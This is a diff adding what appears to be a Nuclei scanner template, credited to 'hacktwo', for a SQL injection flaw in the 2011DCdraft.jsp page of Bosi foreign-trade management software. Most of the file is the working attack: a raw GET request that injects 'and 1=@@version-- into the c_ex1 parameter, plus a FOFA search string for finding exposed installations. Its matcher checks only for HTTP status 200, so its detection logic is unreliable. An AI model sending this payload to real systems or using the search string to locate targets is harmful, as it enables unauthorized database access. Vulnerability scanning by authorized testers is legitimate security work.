@@ -1,0 +1,31 @@
+id: poc-zqbw1mk3kk6ya5f3
+info:
+  name: 博斯外贸管理软件 2011DCdraft.jsp 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zqbw1mk3kk6ya5f3'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zqbw1mk3kk6ya5f3
+    fofa: body="博斯软件"
+http:
+- raw:
+  - 'GET /crm/module/2011DCdraft.jsp?c_ex1=1''and+1=@@version-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
